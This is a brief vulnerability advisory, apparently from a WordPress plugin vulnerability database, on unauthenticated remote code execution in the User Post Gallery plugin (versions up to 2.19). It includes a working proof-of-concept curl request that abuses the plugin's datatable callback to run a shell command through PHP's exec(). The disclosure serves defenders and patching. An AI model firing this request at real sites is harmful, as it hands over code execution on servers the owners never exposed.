## WordPress Plugin Vulnerabilities

# User Post Gallery <= 2.19 - Unauthenticated RCE

### Description

The plugin does not limit what callback functions can be called by users, making it possible to any visitors to run code on sites running it.

### Proof of Concept

Invoke the following curl command to execute the "id" command via PHP's exec() function:
curl -i 'http://127.0.0.1:7777/wp-admin/admin-ajax.php?action=upg\_datatable&field=field:exec:id:NULL:NULL'
